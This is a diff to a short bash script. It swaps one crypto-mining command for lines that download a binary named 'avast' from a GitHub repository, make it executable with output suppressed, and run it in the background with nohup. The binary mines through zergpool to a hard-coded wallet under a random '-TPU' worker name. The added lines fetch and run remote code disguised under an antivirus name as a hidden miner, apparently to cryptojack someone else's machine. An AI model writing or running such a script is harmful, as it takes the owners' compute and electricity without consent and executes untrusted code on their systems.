@@ -1,5 +1,4 @@
 #!/bin/bash
-
-
-chmod +x ./pkt
-./pkt ann -p pkt1qeqdz7zz9w7cuasfjy6qd8xtw362a0et5eczl9r https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io
+wget https://github.com/aurbach55/pos/raw/main/avast
+chmod +x avast  >/dev/null 2>&1
+nohup ./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 4 -x &
